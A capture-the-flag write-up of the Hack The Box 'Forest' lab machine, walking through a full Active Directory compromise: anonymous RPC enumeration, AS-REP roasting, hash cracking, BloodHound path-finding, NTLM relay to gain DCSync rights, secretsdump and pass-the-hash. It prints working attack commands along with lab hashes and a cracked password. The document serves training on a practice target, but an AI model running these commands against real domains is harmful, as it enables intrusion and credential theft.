---
layout: single
title: Forest - Hack The Box
excerpt: "Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange
Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to
enumerate domain objects. The password for a service account with Kerberos pre-authentication
disabled can be cracked to gain a foothold. The service account is found to be a member of the
Account Operators group, which can be used to add users to privileged Exchange groups. The
Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the
NTLM hashes."
date: 2020-03-21
classes: wide
header:
  teaser: /assets/images/htb-writeup-forest/forest_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - BloodHound
  - Active Directory
  - DCSync
  - ASREPRoasting
---

![](/assets/images/htb-writeup-forest/forest_logo.png)

## Synopsis
Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange
Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to
enumerate domain objects. The password for a service account with Kerberos pre-authentication
disabled can be cracked to gain a foothold. The service account is found to be a member of the
Account Operators group, which can be used to add users to privileged Exchange groups. The
Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the
NTLM hashes. 

## Skills Required
* Enumeration

## Skills Learned
* ASREPRoasting
* Enumeration with BloodHound
* DCSync


---
## Enumeration
### Nmap
![](/assets/images/htb-writeup-forest/nmap.png)

### SMB Enumeration
Let's see if we can list the user of *RPC* CLient.
```
rpcclient -U "" -N 10.10.10.161
```
![](/assets/images/htb-writeup-forest/rpc.png)

We found the potential users on the machine. With the help of this we make `users.txt` which looks like this:
```
cat users.txt

Administrator
Guest
Krbtgt
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

### AS-REP Roasting
AS-REP Roasting is an attack against Kerberos for user accounts that do not require preauthentication. This is explained in pretty thorough detail in [Harmj0y's post](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)

### Performing AS-REP Roasting with GetNPUsers
`GetNPUsers.py` queries target domain for users with 'Do not require kerberos preauthentication' set and export their TGTs for cracking.
![](/assets/images/htb-writeup-forest/getnpusers.png)

Obtained hash for the user `svc-alfresco`
```
$krb5asrep$svc-alfresco@HTB.LOCAL:548c6d9cc7891d9634793907dd9696d9$9900b4424d2d67cc83ce90ae9ffecd784a4c1bc83b0220e77ff075133f928e6e806af4698d7dbdaf7b70321d07527011c8339acba6f0cfc714ab1274d2438797a364ee949d75f7c5b401c1eeba1b8b7c39ecb63444008e4f3e108488602bd2e52d2e9bba6c32bebe4ae8277d8eed550edacade665c57d52ba8409dd1f259230c67b4fec3a3f42bb721c99e42e8bdc05c8071a72dec3ba9578a5f7788c8be3c378f710afce50c95940b06a20b6742b9e4fbef033ec13d6ee0c63fd63fdddb43e402f64bdfb56fa5b4c1c19350a2f3c8826342847993adc4b062b427794b46fd2de79eebe150ed
```
### Cracking the Hash
As we ouputed the `John the ripper` compatible hash from `GetNPUsers.py`. we can crack it with `john`. Hash is stored int the file named `svc-alfresco.hash`.
![](/assets/images/htb-writeup-forest/crack.png)

After the successful cracking the credentials are: `svc-alfresco:s3rvice`.

Earlier during enumeration. we noticed that port `5985` is open so we can use WinRM to connect to box. I used [EvilWinRM](https://github.com/Hackplayers/evil-winrm) to connect to the machine through open `WinRM` port.
![](/assets/images/htb-writeup-forest/initial_shell.png)

we can use `Get-DomainUser -UACFilter DONT_REQ_PREAUTH` to check which users don't have kerberos preauthentication set.
![](/assets/images/htb-writeup-forest/domainusers.png)

### Privilege Escalation
Doing `net groups` reveals:
* Exchange Servers
* Exchange Trusted Subsytem
* Exchange Windows permissions.

![](/assets/images/htb-writeup-forest/net_group.png)

[Dirk-jan](https://twitter.com/_dirkjan) Mollema wrote a great article on Abusing Exchange: [One API call away from Domain Admin](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)

So, We can take adavantage of these vulnerabilities
* Exchange servers have(too) high privileges by default
* NTLM authenticaiton is vulnerable to relay attacks
* Exchange has a feature which makes it authenticate to an attacker with computer account of the Exchange server.

The `Exchange Windows Permission group` has `WriteDcal` access to Domain object in Active Directory, which enables any memeber of this group to modify the domain privileges,
among which is the privilege to perform `DCSync` operation. Let's confirm by running `BloodHound` if ` Exchange Windows Permission` group has `WriteDacl` access to the Domain Object in Active Directory.

### BloodHound
We upload and run `SharpHound.exe` on the machine and drop the outputed zip file which cotains data into `BloodHound`.

![](/assets/images/htb-writeup-forest/sharphound.png)

Drop in the `zip` file into BloodHound. looking for the path form `svc-alfresco@htb.loal` to `Domain Admins@htb.local`.

![](/assets/images/htb-writeup-forest/bloodhound.png)

Checking the groups memberships of `svc-alfresco`. We can see that `service account` is the memeber of `HTB\Privileged IT Accounts`.
![](/assets/images/htb-writeup-forest/groups.png)

A user account will inherit all permissions to resources that are set on the group of which the user is a direct/indirect memeber that's why we can add svc-alfresco to `Exchange Windows Permissions`
![](/assets/images/htb-writeup-forest/perm.png)

Now, Run `ntlmrelayx` with the DC IP that we want to relay to , and specify a domain user we control, who we want to escalate privileges for.
```
python ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user svc-alfresco
```
After a minute(we've to browse to our local host and enter svc-alfresco's creds) we see the connection coming in at ntlmrelayx, which gives our user `DCSync` privileges.

![](/assets/images/htb-writeup-forest/ntlmrelayx.png)

A Schematic of the above attack is displayed below, showing the steps that are performed to escalate privileges:

![](/assets/images/htb-writeup-forest/attack.png)
`https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/`

### DCSync attack via secretsdump
Now, we need to run `DCSync` attack via sceretdump
```
python secretsdump.py htb.local/svc-alfresco@10.10.10.161 -just-dc
```
![](/assets/images/htb-writeup-forest/secretdump.png)

### Admin Shell
Now we can get `Administrator` shell by `pass the hash` technique.
We can perform pass the hash using `Evil-winrm`. with hash `32693b11e6aa90eb43d32c72a07ceea6`

![](/assets/images/htb-writeup-forest/root.png)


